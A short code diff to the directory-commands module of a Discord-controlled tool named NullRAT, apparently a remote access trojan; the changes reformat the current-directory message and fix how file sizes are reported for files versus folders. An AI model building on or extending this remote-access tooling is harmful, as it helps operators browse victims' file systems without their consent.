@@ -23,7 +23,7 @@ class DirectoryCommands(commands.Cog):
                 embed=self.bot.genEmbed(
                     "Current directory of NullRAT:", 
                     datetime.now(), 
-                    f"`{os.getcwd()}`"
+                    f"```{os.getcwd()}```"
                 )
             )
 
@@ -139,11 +139,18 @@ class DirectoryCommands(commands.Cog):
                     pass
                 
                 try:
-                    embed.add_field(
-                        name = "File Size:",
-                        value = convert_bytes(os.path.getsize(c)) if os.path.isdir(c) else "N/A",
-                        inline = False
-                    )
+                    if os.path.isdir(c) == False:
+                        embed.add_field(
+                            name = "File Size:",
+                            value = convert_bytes(os.path.getsize(c)),
+                            inline = False
+                        )
+                    else:
+                        embed.add_field(
+                            name = "File Size:",
+                            value = 'N/A',
+                            inline = False
+                        )
                 except:
                     pass
                     
